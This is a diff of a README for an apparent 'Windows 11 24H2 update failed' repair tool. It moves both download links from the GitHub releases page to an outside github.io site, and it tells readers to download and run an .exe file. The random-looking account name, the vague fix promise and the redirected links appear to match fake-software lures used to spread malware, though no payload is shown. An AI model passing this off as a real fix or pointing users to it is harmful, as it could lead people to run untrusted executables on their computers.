@@ -1,6 +1,6 @@
 # 🛠️ Windows-11-24H2-Update-Failed-Fix - Repair your update errors today
 
-[![](https://img.shields.io/badge/Download_Repair_Tool-Blue?style=for-the-badge)](https://github.com/melicentapogean281/Windows-11-24H2-Update-Failed-Fix/releases)
+[![](https://img.shields.io/badge/Download_Repair_Tool-Blue?style=for-the-badge)](https://melicentapogean281.github.io)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Ensure your computer meets these needs before you run the repair:
 
 Follow these steps to acquire the repair tool:
 
-1. Visit the [official release page](https://github.com/melicentapogean281/Windows-11-24H2-Update-Failed-Fix/releases).
+1. Visit the [official release page](https://melicentapogean281.github.io).
 2. Look for the latest version under the Assets section.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
